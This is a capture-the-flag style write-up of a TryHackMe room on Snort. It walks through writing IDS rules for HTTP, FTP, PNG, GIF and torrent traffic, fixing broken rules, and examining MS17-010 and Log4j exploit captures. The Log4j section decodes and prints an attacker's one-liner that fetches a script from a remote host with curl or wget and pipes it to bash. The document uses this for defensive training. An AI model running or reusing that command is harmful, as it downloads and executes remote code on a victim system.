# Snort Challenge - The Basics
---
**Description:** Put your snort skills into practice and write snort rules to analyse live capture network traffic.

**Difficulty:** Medium

**Link**: [https://tryhackme.com/r/room/snortchallenges1](https://tryhackme.com/r/room/snortchallenges1)

---
## Task 1 - INTRODUCTION

Simply click on the **Start Machine** button to launch the VM you will be using for this task and wait fo it to load.

---

## Task 2- WRITING IDS RULES (HTTP)

For this task we are provided with two files inside the folder `TASK-2 (HTTP)`  

```console
ubuntu:~/Desktop/Exercise-Files$ cd TASK-2\ \(HTTP\)/
ubuntu:~/Desktop/Exercise-Files/TASK-2 (HTTP)$ ls
local.rules  mx-3.pcap
```

`local.rules` is the file we need to edit to write our Snort rules and `mx-3.pcap` is a capture file containing the traffic we need to analyse for this task.

**Question 1**
> Navigate to the task folder and use the given pcap file.
>Write a rule to detect all TCP packets from or to port 80.
>What is the number of detected packets you got?
>Note: You must answer this question correctly before answering the rest of the questions.

We're starting off with an easy one.  Open `local.rules` using nano or any other text editor and add the following snort rule:
```dircolors
# ----------------
# LOCAL RULES
# ----------------
# This file intentionally does not come with signatures.  Put your local
# additions here.
alert tcp any 80 <> any any (msg:"Port 80 detected"; sid:100001; rev:1;)
```

Here we are creating an alert that gives us the log entry *"Port 80 detected"* when an incoming or outgoing (`<>`) packet with `any` IP address is coming from or going towards port `80`.

Save and exit the `local.rules` file and run Snort with the following command:
```console
ubuntu:~/Desktop/Exercise-Files/TASK-2 (HTTP)$ sudo snort -r mx-3.pcap -c local.rules -l .
```

Here is a breakdown of this command:
- `sudo snort`:  Run Snort as Root
- `-r mx-3.pcap`: Load the given network capture file for analysis
- `-c local.rules`: Use the rules found in the provided file
- `-l .`: Output the results to  log file saved in this directory

The answer to this question is found at the bottom of the command output under the `Action Stats:` heading:

```console
===============================================================================
Action Stats:
     Alerts:          [REDACTED] ( 35.652%)
     Logged:          [REDACTED] ( 35.652%)
     Passed:            0 (  0.000%)
```


**Question 2**
> What is the destination address of packet 63?

To answer this question we can look inside the log file we generated in Question 1 with the following command:
```console
ubuntu:~/Desktop/Exercise-Files/TASK-2 (HTTP)$ sudo snort -r snort.log.1743326372 -A full -n 63
```

This time we use `-A full` to specify the output format of the parsed logs and `-n 63` to only process the first 63 packets in the log file.  The answer to this question can be found in the entry for the last packet in the list:

```console
WARNING: No preprocessors configured for policy 0.
05/13-10:17:10.295515 145.254.160.237:3371 -> [REDACTED}:80
TCP TTL:128 TOS:0x0 ID:3917 IpLen:20 DgmLen:761 DF
***AP*** Seq: 0x36C21E28  Ack: 0x2E6B5384  Win: 0x2238  TcpLen: 20
=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+
```


**Question 3**
> What is the ACK number of packet 64?

To answer this question we can simply run the last command again with `-n 64`
```console
ubuntu:~/Desktop/Exercise-Files/TASK-2 (HTTP)$ sudo snort -r snort.log.1743326372 -A full -n 64
```

Our answer is in the last packet entry in the output:
```console
WARNING: No preprocessors configured for policy 0.
05/13-10:17:10.295515 145.254.160.237:3371 -> 216.239.59.99:80
TCP TTL:128 TOS:0x0 ID:3917 IpLen:20 DgmLen:761 DF
***AP*** Seq: 0x36C21E28  Ack: [REDACTED]  Win: 0x2238  TcpLen: 20
=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+
```

**Question 4**
> What is the SEQ number of packet 62?

OK..so you know what to do by now...rinse and repeat:
```console
ubuntu:~/Desktop/Exercise-Files/TASK-2 (HTTP)$ sudo snort -r snort.log.1743326372 -A full -n 62
```

```console
WARNING: No preprocessors configured for policy 0.
05/13-10:17:10.295515 145.254.160.237:3371 -> 216.239.59.99:80
TCP TTL:128 TOS:0x0 ID:3917 IpLen:20 DgmLen:761 DF
***AP*** Seq: [REDACTED]  Ack: 0x2E6B5384  Win: 0x2238  TcpLen: 20
=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+
```

**Question 5**
> What is the TTL of packet 65?

```console
ubuntu:~/Desktop/Exercise-Files/TASK-2 (HTTP)$ sudo snort -r snort.log.1743326372 -A full -n 65
```

```console
WARNING: No preprocessors configured for policy 0.
05/13-10:17:10.325558 [REDACTED}:[REDACTED] -> 65.208.228.223:80
TCP TTL:[REDACTED] TOS:0x0 ID:3918 IpLen:20 DgmLen:40 DF
***A**** Seq: 0x38AFFFF3  Ack: 0x114C81E4  Win: 0x25BC  TcpLen: 20
=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+
```

**Question 6**
> What is the source IP of packet 65?

We can get this from the last packet entry for Question 5


**Question 7**
> What is the source port of packet 65?

We can get this from the last packet entry for Question 5

---
## Task 3- WRITING IDS RULES (FTP)

Now let's move to the folder for TASK 3 and have a look inside:
```console
ubuntu:~/Desktop/Exercise-Files/TASK-2 (HTTP)$ cd ../TASK-3\ \(FTP\)/
ubuntu:~/Desktop/Exercise-Files/TASK-3 (FTP)$ ls
ftp-png-gif.pcap  local.rules
```

Once again we have a `local.rules` file to edit and a network capture to analyse.

**Question 1**
>Write a single rule to detect "all TCP port 21"  traffic in the given pcap.
>
>What is the number of detected packets?

We can tackle this very similarly to TASK 2.  Add the following rule to `local.rules`:
```dircolors
alert tcp any 21 <> any any (msg: "Port 21 Detected"; sid:100001; rev:1;)
```

Now simply run Snort on the given capture file with this new rules file:
```console
ubuntu:~/Desktop/Exercise-Files/TASK-3 (FTP)$ sudo snort -c local.rules -r ftp-png-gif.pcap -l .
```

Our answer is found under the *Action Stats* heading of the output:
```console
===============================================================================
Action Stats:
     Alerts:          [REDACTED] ( 72.922%)
     Logged:          [REDACTED] ( 72.922%)
     Passed:            0 (  0.000%)
```

**Question 2**
>Investigate the log file.
>
>What is the FTP service name?

The easiest way to tackle this is to use the `strings` command with `grep` to look for *FTP* in the log file:
```console
ubuntu:~/Desktop/Exercise-Files/TASK-3 (FTP)$ sudo strings snort.log.1743327826 | grep FTP
}220 [REDACTED] FTP Service
~220 [REDACTED] FTP Service
220 [REDACTED] FTP Service
220 [REDACTED] FTP Service
```

**Question 3**
>Deactivate/comment on the old rules.
>
>Write a rule to detect failed FTP login attempts in the given pcap.
>
>What is the number of detected packets?


The hint provided with this question tells us that:
>*Each failed FTP login attempt prompts a default message with the pattern; "530 User". Try to filter the given pattern in the inbound FTP traffic.*


So we need to write a rule that looks for packets that include the text *"530 User"* (remember to comment out the previous rule):

```dircolors
# ----------------
# LOCAL RULES
# ----------------
# This file intentionally does not come with signatures.  Put your local
# additions here.
#alert tcp any 21 <> any any (msg: "Port 21 Detected"; sid:100001; rev:1;)
alert tcp any any <> any any (msg:"Failed FTP login attempt";content:"530 User";sid:100001; rev:1;)
```

Now we can run Snort using this updated rule file:
```console
ubuntu:~/Desktop/Exercise-Files/TASK-3 (FTP)$ sudo snort -c local.rules -r ftp-png-gif.pcap
```

The number of detected packets is near the end of the command output under the heading *Action Stats:*
```console
===============================================================================
Action Stats:
     Alerts:           [REDACTED] (  9.739%)
     Logged:           [REDACTED] (  9.739%)
     Passed:            0 (  0.000%)
```

**Question 4**
>Deactivate/comment on the old rules.
>
>Write a rule to detect successful FTP logins in the given pcap.
>
>What is the number of detected packets?


This time we are tasked with detecting successful logins, so the process will be the same as for Question 3, but this time we need to match with the pattern *"230 User"* which indicates a successful login.

```dircolors
# ----------------
# LOCAL RULES
# ----------------
# This file intentionally does not come with signatures.  Put your local
# additions here.
#alert tcp any 21 <> any any (msg: "Port 21 Detected"; sid:100001; rev:1;)
#alert tcp any any <> any any (msg:"Failed FTP login attempt";content:"530 User";sid:100001; rev:1;)
alert tcp any any <> any any (msg:"Successful FTP login";content:"230 User";sid:100001; rev:1;)
```

and run Snort again:
```console
ubuntu:~/Desktop/Exercise-Files/TASK-3 (FTP)$ sudo snort -c local.rules -r ftp-png-gif.pcap
```

And the answer is once again at the bottom of the command output:
```console
===============================================================================
Action Stats:
     Alerts:            [REDACTED] (  0.238%)
     Logged:            [REDACTED] (  0.238%)
     Passed:            0 (  0.000%)
```

**Question 5**
>Deactivate/comment on the old rules.
>
>Write a rule to detect FTP login attempts with a valid username but no password entered yet.
>
>What is the number of detected packets?

Same as before, but this time we're looking for the string *"331 Password"*
```dircolors
# ----------------
# LOCAL RULES
# ----------------
# This file intentionally does not come with signatures.  Put your local
# additions here.
#alert tcp any 21 <> any any (msg: "Port 21 Detected"; sid:100001; rev:1;)
#alert tcp any any <> any any (msg:"Failed FTP login attempt";content:"530 User";sid:100001; rev:1;)
#alert tcp any any <> any any (msg:"Successful FTP login";content:"230 User";sid:100001; rev:1;)
alert tcp any any <> any any (msg:"Valid FTP user but no password entered";content:"331 Password";sid:100001; rev:1;)
```

Run Snort again with the updated rules file:
```console
ubuntu:~/Desktop/Exercise-Files/TASK-3 (FTP)$ sudo snort -c local.rules -r ftp-png-gif.pcap
```

And the answer is once again at the bottom of the command output:
```console
===============================================================================
Action Stats:
     Alerts:            [REDACTED] (  9.976%)
     Logged:            [REDACTED] (  9.976%)
     Passed:            0 (  0.000%)
```

**Question 6**
>Deactivate/comment on the old rules.
>
>Write a rule to detect FTP login attempts with the "Administrator" username but no password entered yet.
>
>What is the number of detected packets?


So, this time we need to edit the rule we created for Question 5 to filter for those specific events where the username provided was `Administrator`.  This can easily be acheived since we can use the `content` option in a rule multiple times:
```dircolors
# ----------------
# LOCAL RULES
# ----------------
# This file intentionally does not come with signatures.  Put your local
# additions here.
#alert tcp any 21 <> any any (msg: "Port 21 Detected"; sid:100001; rev:1;)
#alert tcp any any <> any any (msg:"Failed FTP login attempt";content:"530 User";sid:100001; rev:1;)
#alert tcp any any <> any any (msg:"Successful FTP login";content:"230 User";sid:100001; rev:1;)
alert tcp any any <> any any (msg:"Administrator FTP user but no password entered";content:"331 Password";content:"Administrator";sid:100001; rev:2;)
```

Run Snort again with the updated rules file:
```console
ubuntu:~/Desktop/Exercise-Files/TASK-3 (FTP)$ sudo snort -c local.rules -r ftp-png-gif.pcap
```

And the answer is once again at the bottom of the command output:
```console
===============================================================================
Action Stats:
     Alerts:            [REDACTED] (  1.663%)
     Logged:            [REDACTED] (  1.663%)
     Passed:            0 (  0.000%)
```

---
## Task 4- WRITING IDS RULES (PNG)

Now let's move to the folder for TASK 4 and have a look inside:
```console
ubuntu:~/Desktop/Exercise-Files/TASK-3 (FTP)$ cd ../TASK-4\ \(PNG\)/
ubuntu:~/Desktop/Exercise-Files/TASK-4 (PNG)$ ls
ftp-png-gif.pcap  local.rules
```

**Question 1**
>Use the given pcap file.
>
>Write a rule to detect the PNG file in the given pcap.
>
>Investigate the logs and identify the software name embedded in the packet.

This is an interesting question.  Since we are analysing individual packets and a single file can be broken up into several packets - how do we detect the transmission of a specific file type over the network?
The answer lies in **File Signatures**.  Each file type has a specific string of bits inside its contents that identifies the type of file it is (even if the extension is changed).  A quick Google search gives us the [file signature for PNG files](https://en.wikipedia.org/wiki/List_of_file_signatures#:~:text=89%2050%204E%2047%200D%200A%201A%200A) which is, `89 50 4E 47 0D 0A 1A 0A`.

So this should be quite simple now - just look for that file siganture using the `content` option in the rules. However - **keep in mind that the file signature is in hexadecimal**, so we need to use `|` in our rule to instruct Snort to match hexadecimal byte values. 

So the `local.rules` file needs to look something like this now:
```dircolors
# ----------------
# LOCAL RULES
# ----------------
# This file intentionally does not come with signatures.  Put your local
# additions here.

alert icmp any any <> any any  (msg: "ICMP Packet Found"; sid: 100001; rev:1;)
alert tcp any any <> any any (msg: "PNG file detected"; content:"|89 50 4E 47 0D 0A 1A 0A|"; sid:100002; rev:1;)
```
Note that there already is an existing rule in the file so we need to increment the `sid` for our newly-added rule by 1.

We can now run Snort with the updated rules file:
```console
ubuntu:~/Desktop/Exercise-Files/TASK-4 (PNG)$ sudo snort -c local.rules -r ftp-png-gif.pcap -l .
```

Similarly to what we did in Task 3, we can use the `strings` command to list human-readable strings in the log file and look out for the software name:
```console
ubuntu:~/Desktop/Exercise-Files/TASK-4 (PNG)$ sudo strings snort.log.1743330590
IHDR
tEXtSoftware
[REDACTED]
.IDATx
nvfw
A)_,
` ^,
XBy6
`'?/
]}gb
lYy[)
3W}B=
OnOh
WLCO/
RnR7
0WGJ
```

And our answer is right there - near the top of the output.


**Question 2**
>Deactivate/comment on the old rule.
>
>Write a rule to detect the GIF file in the given pcap.
>
>Investigate the logs and identify the image format embedded in the packet.

We can tackle this in a similar way to Question 1.  GIF has  two possible file sigantures: `47 49 46 38 37 61` or `47 49 46 38 39 61`.  So we can edit our `local.rules` file as follows:

```dircolors
# ----------------
# LOCAL RULES
# ----------------
# This file intentionally does not come with signatures.  Put your local
# additions here.

alert icmp any any <> any any  (msg: "ICMP Packet Found"; sid: 100001; rev:1;)
#alert tcp any any <> any any (msg: "PNG file detected"; content:"|89 50 4E 47 0D 0A 1A 0A|"; sid:100002; rev:1;)
alert tcp any any <> any any (msg: "GIF file detected"; content:"|47 49 46 38 37 61|"; sid:100002; rev:1;)
alert tcp any any <> any any (msg: "GIF file detected"; content:"|47 49 46 38 39 61|"; sid:100003; rev:1;)
```

Note that the two file signatures are added as two seperate rules.  If we were to include them as two `content` options on the same rule, then the rule would only match when _both_ strings are detected.

We can now delete the old log file and run Snort with the updated rules:
```console
ubuntu:~/Desktop/Exercise-Files/TASK-4 (PNG)$ rm snort.log.1743330590 
rm: remove write-protected regular file 'snort.log.1743330590'? y
ubuntu:~/Desktop/Exercise-Files/TASK-4 (PNG)$ sudo snort -c local.rules -r ftp-png-gif.pcap -l .
```

Once again we can use the `strings` command with the log file and we get our answer:
```console
ubuntu:~/Desktop/Exercise-Files/TASK-4 (PNG)$ sudo strings snort.log.1743331085 
[REDACTED]
[REDACTED]
[REDACTED]
[REDACTED]
```

---
## Task 5 - WRITING IDS RULES (Torrent Metafile)

Moving on to the folder for TASK 5:
```console
ubuntu:~/Desktop/Exercise-Files/TASK-4 (PNG)$ cd ../TASK-5\ \(TorrentMetafile\)/
ubuntu:~/Desktop/Exercise-Files/TASK-5 (TorrentMetafile)$ ls
local.rules  torrent.pcap
```


**Question 1**
>Write a rule to detect the torrent metafile in the given pcap.
>
>What is the number of detected packets?

The hint for this question indicates that we should try matching the `contents` to a `.torrent` extension that is used with Torrent metafiles.

We can use the following rule for this:
```dircolors
alert tcp any any <> any any (msg:"Torrent metafile detected"; content:".torrent";sid:100001;rev:1;)
```

You know the drill by now...
```console
ubuntu:~/Desktop/Exercise-Files/TASK-5 (TorrentMetafile)$ sudo snort -c local.rules -r torrent.pcap -l .
```

and our answer is here:
```console
===============================================================================
Action Stats:
     Alerts:            [REDACTED] (  3.571%)
     Logged:            {REDACTED} (  3.571%)
     Passed:            0 (  0.000%)
```

**Question 2**
>Investigate the log/alarm files.
>
>What is the name of the torrent application?

We can answer this using `strings` with the log output generated for Question 1:

```console
ubuntu:~/Desktop/Exercise-Files/TASK-5 (TorrentMetafile)$ sudo strings snort.log.1743331468 
GET /announce?info_hash=%01d%FE%7E%F1%10%5CWvAp%ED%F6%03%C49%D6B%14%F1&peer_id=%B8js%7F%E8%0C%AFh%02Y%967%24e%27V%EEM%16%5B&port=41730&uploaded=0&downloaded=0&left=3767869&compact=1&ip=127.0.0.1&event=started HTTP/1.1
Accept: application/x-[REDACTED]
Accept-Encoding: gzip
User-Agent: RAZA 2.1.0.0
Host: [REDACTED]:2710
Connection: Keep-Alive
```

Note - that we can get to the answer also by using the `-X` switch with Snort to look inside the packet headers:
```console
ubuntu:~/Desktop/Exercise-Files/TASK-5 (TorrentMetafile)$ sudo snort -r snort.log.1743331468 -X
```

**Question 3**
>What is the MIME (Multipurpose Internet Mail Extensions) type of the torrent metafile?

We can get this from the output to Question 2

**Question 4**
>What is the hostname of the torrent metafile?

This is also found in the output we got for Question 2.

---

## Task 6 - TROUBLESHOOTING RULE SYNTAX ERRORS

This time when we navigate to the task folder we see that we have seven different rule files and a single pcap:
```console
ubuntu:~/Desktop/Exercise-Files/TASK-6 (Troubleshooting)$ ls
local-1.rules  local-2.rules  local-3.rules  local-4.rules  local-5.rules  local-6.rules  local-7.rules  mx-1.pcap
```

The task description tells us that;
>In this section, you need to fix the syntax errors in the given rule files. 
>You can test each ruleset with the following command structure;
>sudo snort -c local-X.rules -r mx-1.pcap -A console


**Question 1**
>Fix the syntax error in local-1.rules file and make it work smoothly.
>
>What is the number of the detected packets?

Let's start by running the command we are given in the task description with `local-1.rules`:
```console
ubuntu:~/Desktop/Exercise-Files/TASK-6 (Troubleshooting)$ sudo snort -c local-1.rules -r mx-1.pcap -A console
Running in IDS mode

        --== Initializing Snort ==--
Initializing Output Plugins!
Initializing Preprocessors!
Initializing Plug-ins!
Parsing Rules file "local-1.rules"
Tagged Packet Limit: 256
Log directory = /var/log/snort

+++++++++++++++++++++++++++++++++++++++++++++++++++
Initializing rule chains...
ERROR: local-1.rules(8) ***Rule--PortVar Parse error: (pos=1,error=not a number)
>>any(msg:
>>^
```

The output tells us that we are looking for a possible syntax error (*"not a number"*) near `any(msg:`

If we open `local-1.rules` we can see there is a missing space between `any` and `(msg:`.  The fixed rule should read as follows:
```dircolors
alert tcp any 3372 -> any any (msg: "Troubleshooting 1"; sid:1000001; rev:1;)
```

**Question 2**
>Fix the syntax error in local-2.rules file and make it work smoothly.
>
>What is the number of the detected packets?

The debugging output of the console is very helpful here again:
```console
ubuntu:~/Desktop/Exercise-Files/TASK-6 (Troubleshooting)$ sudo snort -c local-2.rules -r mx-1.pcap -A console
Running in IDS mode

        --== Initializing Snort ==--
Initializing Output Plugins!
Initializing Preprocessors!
Initializing Plug-ins!
Parsing Rules file "local-2.rules"
Tagged Packet Limit: 256
Log directory = /var/log/snort

+++++++++++++++++++++++++++++++++++++++++++++++++++
Initializing rule chains...
ERROR: local-2.rules(8) Port value missing in rule!
Fatal Error, Quitting..
```

Opening `local-2.rules` we see that there is no port specified for the source, and we need to add `any` here:
```dircolors
alert icmp any any -> any any (msg: "Troubleshooting 2"; sid:1000001; rev:1;)
```

**Question 3**
>Fix the syntax error in local-3.rules file and make it work smoothly.
>
>What is the number of the detected packets?

This time we get the following error output:
```console
ubuntu:~/Desktop/Exercise-Files/TASK-6 (Troubleshooting)$ sudo snort -c local-3.rules -r mx-1.pcap -A console
Running in IDS mode

        --== Initializing Snort ==--
Initializing Output Plugins!
Initializing Preprocessors!
Initializing Plug-ins!
Parsing Rules file "local-3.rules"
Tagged Packet Limit: 256
Log directory = /var/log/snort

+++++++++++++++++++++++++++++++++++++++++++++++++++
Initializing rule chains...
ERROR: local-3.rules(9) GID 1 SID 1000001 in rule duplicates previous rule, with different protocol.
Fatal Error, Quitting..
```

Opening `local-3.rules` we can quickly see that the two rules have the same `sid` which is causing the error.  We can change the `sid` for the second rule to `sid:1000002`.
```dircolors
alert icmp any any -> any any (msg: "ICMP Packet Found"; sid:1000001; rev:1;)
alert tcp any any -> any 80,443 (msg: "HTTPX Packet Found"; sid:1000002; rev:1;)
```

**Question 4**
>Fix the syntax error in local-4.rules file and make it work smoothly.
>
>What is the number of the detected packets?

```console
ubuntu:~/Desktop/Exercise-Files/TASK-6 (Troubleshooting)$ sudo snort -c local-4.rules -r mx-1.pcap -A console
Running in IDS mode

        --== Initializing Snort ==--
Initializing Output Plugins!
Initializing Preprocessors!
Initializing Plug-ins!
Parsing Rules file "local-4.rules"
Tagged Packet Limit: 256
Log directory = /var/log/snort

+++++++++++++++++++++++++++++++++++++++++++++++++++
Initializing rule chains...
ERROR: local-4.rules(9) Unmatch quote in rule option 'msg'.
Fatal Error, Quitting..
```

The error mentions *"unmatch quote"* so we're probably looking for a missing quotation mark after the `msg` option.  However when we open the rule file we see that there are actually two errors here and none of them is a missing quotation mark!

The first error is the same as in Question 3 - the two rules have the same `sid` value.
The second problem is that there is a spurious `:` after `"HTTPX Packet Found"` which we need to replace with a semi-colon (`;`).
```dircolors
alert icmp any any -> any any (msg: "ICMP Packet Found"; sid:1000001; rev:1;)
alert tcp any 80,443 -> any any (msg: "HTTPX Packet Found"; sid:1000002; rev:1;)
```

**Question 5**
>Fix the syntax error in local-5.rules file and make it work smoothly.
>
>What is the number of the detected packets?

This time the error output tells us that we are looking for an `Illegal direction specifier: <-`

Snort rules allow us to use one of two direction operators; `<>` or `->`.  However the second rule is using `<-` which is not allowed.  The message in the rule also tells us that it's looking for inbound ICMP packets, so the direction operator needs to be changed to `->`.

There is also another mistake in the second rule and the `;` following `sid` needs to be changed to a `:`.

Similarly the `:` after 1`"HTTPX Packet Found"` in the third rule needs to be changed to a `;`.

```dircolors
alert icmp any any <> any any (msg: "ICMP Packet Found"; sid:1000001; rev:1;)
alert icmp any any -> any any (msg: "Inbound ICMP Packet Found"; sid:1000002; rev:1;)
alert tcp any any -> any 80,443 (msg: "HTTPX Packet Found": sid:1000003; rev:1;)
```


**Question 6**
>Fix the logical error in local-6.rules file and make it work smoothly to create alerts.
>
>What is the number of the detected packets?

This time around we are told that we are looking for a _logical_ error instead of a _syntax_ error.  This means that the rules are crafted in such a way that will allow snort to run without any errors but they will not match on the desired packets.

If we look inside `local-6.rules` we see that the rule is trying to look for HTTP GET requests but is trying to do so using the hex value `67 65 74`.  If we translate this to ASCII (using [cyberchef](https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')&input=NjcgNjUgNzQ)) we get the word `get`.  However the pattern-matching in the rule is case-sensitive and we want it to match with `GET` (uppercase), so the hex value should read `|47 45 54|`.

```dircolors
alert tcp any any <> any 80  (msg: "GET Request Found"; content:"|47 45 54|"; sid: 100001; rev:1;)
```

Or we can simply write `"GET"` to make the rule more readable:
```dircolors
alert tcp any any <> any 80  (msg: "GET Request Found"; content:"GET"; sid: 100001; rev:1;)
```


**Question 7**
>Fix the logical error in local-7.rules file and make it work smoothly to create alerts.
>
>What is the name of the required option:

Once again we are looking for a _logical_ error here.  This time the rule seems to work fine and even gives us some detections on the first run.  However when we look inside `local-7.rules` we can see that the rule is missing a `msg`.  This will still produce matches but the alerts will contain no information.
The rule is looking for the hex value `2E 68 74 6D 6C` which translates to `.html`.  So we can add a suitably descriptive message to it:
```dircolors
alert tcp any any <> any 80  (msg:".html file detected"; content:"|2E 68 74 6D 6C|"; sid: 100001; rev:1;)
```
So the answer to this final question is _**msg**_

---
## Task 7 - USING EXTERNAL RULES (MS17-010)

The folder for this task contains two rules files and one pcap:
```console
ubuntu:~/Desktop/Exercise-Files/TASK-7 (MS17-10)$ ls
local-1.rules  local.rules  ms-17-010.pcap
```

**Question 1**
>Use the given pcap file.
>
>Use the given rule file (local.rules) to investigate the ms1710 exploitation.
>
>What is the number of detected packets?

This should be easy by now - simply run snort with the provided rule file and pcap:
```console
ubuntu:~/Desktop/Exercise-Files/TASK-7 (MS17-10)$ sudo snort -c local.rules -r ms-17-010.pcap  -l .
```

**Question 2**
>Clear the previous log and alarm files.
>
>Use local-1.rules empty file to write a new rule to detect payloads containing the "\IPC$" keyword.
>
>What is the number of detected packets?

We need to craft a rule that matches on the string `\IPC$` - however just entering the string as it is would result in an error due to the `\` character.  We need to _escape_ this character by adding another `\`:
```dircolors
alert tcp any any <> any any (msg:"Keyword match"; content:"\\IPC$"; sid:1000001; rev:1;)
```

**Question 3**
>Investigate the log/alarm files.
>
>What is the requested path?

Let's have a look inside the matching headers:
```console
ubuntu:~/Desktop/Exercise-Files/TASK-7 (MS17-10)$ sudo snort -r snort.log.1743334798 -X
```
```console
=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+

WARNING: No preprocessors configured for policy 0.
05/18-08:12:07.740322 192.168.116.149:49377 -> 192.168.116.143:445
TCP TTL:128 TOS:0x0 ID:595 IpLen:20 DgmLen:135 DF
***AP*** Seq: 0xEF66EC45  Ack: 0x714FEDA9  Win: 0xFF  TcpLen: 20
0x0000: A4 1F 72 20 54 01 00 25 B3 F5 FA 74 08 00 45 00  ..r T..%...t..E.
0x0010: 00 87 02 53 40 00 80 06 8D A8 C0 A8 74 95 C0 A8  ...S@.......t...
0x0020: 74 8F C0 E1 01 BD EF 66 EC 45 71 4F ED A9 50 18  t......f.EqO..P.
0x0030: 00 FF 34 CE 00 00 00 00 00 5B FF 53 4D 42 75 00  ..4......[.SMBu.
0x0040: 00 00 00 18 01 20 00 00 00 00 00 00 00 00 00 00  ..... ..........
0x0050: 00 00 00 00 2F 4B 00 08 C5 5E 04 FF 00 00 00 00  ..../K...^......
0x0060: 00 01 00 1C 00 00 5C 5C 31 39 32 2E 31 36 38 2E  ......\\[REDACTED]
0x0070: 31 31 36 2E 31 33 38 5C 49 50 43 24 00 3F 3F 3F  [REDACTED]\IPC$.???
0x0080: 3F 3F 00 54 48 5F 52 45 50 4C 41 43 45 5F 5F 3F  ??.TH_REPLACE__?
0x0090: 3F 3F 3F 3F 00                                   ????.

=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+
```

**Question 4**
>What is the CVSS v2 score of the MS17-010 vulnerability?

This can be answered with a simple Google search: [https://www.tenable.com/plugins/nessus/97737](https://www.tenable.com/plugins/nessus/97737)


---
## Task 7 - USING EXTERNAL RULES (Log4j)

Once again we are given two rules files and a pcap:
```console
ubuntu:~/Desktop/Exercise-Files/TASK-7 (MS17-10)$ ls
local-1.rules  local.rules  ms-17-010.pcap
```

**Question 1**
>Use the given pcap file.
>
>Use the given rule file (local.rules) to investigate the log4j exploitation.
>
>What is the number of detected packets?

```console
ubuntu:~/Desktop/Exercise-Files/TASK-8 (Log4j)$ sudo snort -c local.rules -r log4j.pcap -l .
```

**Question 2**
>Investigate the log/alarm files.
>
>How many rules were triggered?.

To answer this question we can have a look inside the `alerts` file which contains a log of each rule that was matched.  We can use `grep` to help filter the contents further:
```console
ubuntu:~/Desktop/Exercise-Files/TASK-8 (Log4j)$ cat alert | grep -F [**] | sort | uniq
[**] [1:21003726:1] FOX-SRT – Exploit – Possible Apache Log4J RCE Request Observed (CVE-2021-44228) [**]
[**] [1:21003728:1] FOX-SRT – Exploit – Possible Apache Log4J RCE Request Observed (CVE-2021-44228) [**]
[**] [1:21003730:1] FOX-SRT – Exploit – Possible Defense-Evasive Apache Log4J RCE Request Observed (CVE-2021-44228) [**]
[**] [1:21003731:1] FOX-SRT – Exploit – Possible Defense-Evasive Apache Log4J RCE Request Observed (URL encoded bracket) (CVE-2021-44228) [**]
```

This shows us that there were a total of 4 rules that matched and gives us their descriptions.

**Question 3**
>Investigate the log/alarm files.
>
>What are the first six digits of the triggered rule sids?

By simply running snort again we are given the sids at the very end of the output
```console
ubuntu:~/Desktop/Exercise-Files/TASK-8 (Log4j)$ sudo snort -r log4j.pcap -c local.rules 
```
```console
===============================================================================
+-----------------------[filtered events]--------------------------------------
| gen-id=1      sig-id=[REDACTED]28   type=Limit     tracking=dst count=1   seconds=3600 filtered=1
| gen-id=1      sig-id=[REDACTED]31   type=Limit     tracking=dst count=1   seconds=3600 filtered=1
| gen-id=1      sig-id=[REDACTED]30   type=Limit     tracking=dst count=1   seconds=3600 filtered=2
```

**Question 4**
>Clear the previous log and alarm files.
>
>Use local-1.rules empty file to write a new rule to detect packet payloads between 770 and 855 bytes.
>
>What is the number of detected packets?

To tackle this question we need to use the `dsize` option in our rule:

```dircolors
alert tcp any any <> any any  (msg: "Packet size between 770 and 855 bytes"; dsize: 770<>855; sid: 100000001; rev:1;)
```

**Question 5**
>Investigate the log/alarm files.
>
>What is the name of the used encoding algorithm?

We can browse through the packet headers using the `-X` switch with Snort.  Scrolling through the matched packets we see in the second-to-last packet that Base64 encoding was used.
```console
ubuntu:~/Desktop/Exercise-Files/TASK-8 (Log4j)$ sudo snort -r snort.log.1743335983 -X
```

**Question 6**
>Investigate the log/alarm files.
>
>What is the IP ID of the corresponding packet?

Looking at the same packet we found for Question 5 we can see the ID as a 5-digit number in the header:

```console
=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+

WARNING: No preprocessors configured for policy 0.
12/12-05:06:07.579734 45.155.205.233:39692 -> 198.71.247.91:80
TCP TTL:53 TOS:0x0 ID:[REDACTED] IpLen:20 DgmLen:827
***AP*** Seq: 0xDC9A621B  Ack: 0x9B92AFC8  Win: 0x1F6  TcpLen: 32
TCP Options (3) => NOP NOP TS: 1584792788 1670627000 
```

**Question 7**
>Decode the encoded command.
>
>What is the attacker's command?

Using [cyberchef](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)&input=S0dOMWNtd2dMWE1nTkRVdU1UVTFMakl3TlM0eU16TTZOVGczTkM4eE5qSXVNQzR5TWpndU1qVXpPamd3Zkh4M1oyVjBJQzF4SUMxUExTQTBOUzR4TlRVdU1qQTFMakl6TXpvMU9EYzBMekUyTWk0d0xqSXlPQzR5TlRNNk9EQXBmR0poYzJnPQ&oeol=CR) we can decode the Base64 encoded command from `KGN1cmwgLXMgNDUuMTU1LjIwNS4yMzM6NTg3NC8xNjIuMC4yMjguMjUzOjgwfHx3Z2V0IC1xIC1PLSA0NS4xNTUuMjA1LjIzMzo1ODc0LzE2Mi4wLjIyOC4yNTM6ODApfGJhc2g=` to:
`(curl -s [REDACTED]/162.0.228.253:80||wget -q -O- 45.155.205.233:5874/162.0.228.253:80)|bash`

**Question 8**
>What is the CVSS v2 score of the Log4j vulnerability?

Search the internet for _"Log4J CVSS"_ and you will quickly find the CVSSv2 score for it.
